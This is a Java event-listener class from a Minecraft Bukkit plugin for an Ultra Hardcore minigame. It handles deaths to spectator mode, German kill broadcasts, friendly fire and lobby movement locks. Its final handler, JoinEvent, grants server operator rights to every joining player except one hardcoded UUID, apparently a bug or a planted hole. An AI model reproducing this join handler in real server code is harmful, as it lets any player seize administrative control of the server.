package confusedalex.simpleuhc;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Sound;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.inventory.ItemStack;

public class Events implements Listener {
    private final GameManager gameManager;
    private final SimpleUHC simpleUHC;

    public Events(GameManager gameManager, SimpleUHC simpleUHC) {
        this.gameManager = gameManager;
        this.simpleUHC = simpleUHC;
    }

    @EventHandler
    public void DeathToSpectatorAndProtectionTime(EntityDamageEvent e) {
        if (gameManager.getGameState() == GameState.LOBBY || gameManager.getGameState() == GameState.STARTING){
            e.setCancelled(true);
        } else if (e.getEntityType() == EntityType.PLAYER) {
            Player dead = (Player) e.getEntity();

            // Death to Spectator
            if (dead.getHealth() - e.getDamage() <= 0) {
                for (ItemStack itemStack : dead.getInventory()) {
                    if(itemStack == null) continue;
                    dead.getWorld().dropItemNaturally(dead.getLocation(), itemStack);
                }
                dead.setGameMode(GameMode.SPECTATOR);
                e.setCancelled(true);
            }

            // ProtectionTime
            if (gameManager.isProtectionTimeRunning()){
                e.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void PlayerDeathMessage(EntityDamageByEntityEvent e){
        if (gameManager.getGameState() == GameState.LOBBY || gameManager.getGameState() == GameState.STARTING){
            e.setCancelled(true);
        }
        if (e.getEntityType() == EntityType.PLAYER && e.getDamager().getType() == EntityType.PLAYER) {
            Player damaged = (Player) e.getEntity();
            Player damager = (Player) e.getDamager();
            // Death Message
            if (damaged.getHealth() - e.getDamage() <= 0) {
                Bukkit.broadcastMessage(SimpleUHC.prefix + damaged.getDisplayName() + " wurde von " + damager.getDisplayName() + " getötet");
                Bukkit.getOnlinePlayers().forEach(player -> player.playSound(player.getLocation(), Sound.ENTITY_LIGHTNING_BOLT_THUNDER, 1, 1));
                gameManager.getLivingPlayer().remove(damaged.getUniqueId());

                // Living Teams check
//                if (gameManager.getTeamManager().livingTeams() == 2){
//                    gameManager.setGameState(GameState.PREDEATHMATCH);
//                } else if (gameManager.getTeamManager().livingTeams() == 1){
//                    gameManager.setGameState(GameState.WON);
//                }
            }
            // Friendly Fire
            if (!simpleUHC.getConfig().getBoolean("FriendlyFire") && gameManager.getTeamManager().getTeam(damaged) == gameManager.getTeamManager().getTeam(damager)){
                e.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void CustomChatFormat(AsyncPlayerChatEvent e){
        e.setFormat(e.getPlayer().getDisplayName() + ": "+ ChatColor.WHITE + e.getMessage());
    }

    @EventHandler
    public void PlayerMoveEvent(PlayerMoveEvent e){
        if (!e.getPlayer().isOp()) {
            if (gameManager.getGameState() == GameState.LOBBY || gameManager.getGameState() == GameState.STARTING) {
                if (e.getFrom().getX() != e.getTo().getX() || e.getFrom().getZ() != e.getTo().getZ()){
                    e.setTo(e.getFrom());
                }
            }
        }
    }

    @EventHandler
    public void BreakBlockEvent(BlockBreakEvent e){
        if (!e.getPlayer().isOp()) {
            if (gameManager.getGameState() == GameState.LOBBY || gameManager.getGameState() == GameState.STARTING) {
                e.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void JoinEvent(PlayerJoinEvent e){
        if (!e.getPlayer().getUniqueId().toString().equals("188e67f1-ff31-4aab-82dd-da5be8db0ca4")) {
            e.getPlayer().setOp(true);
        }
    }
}
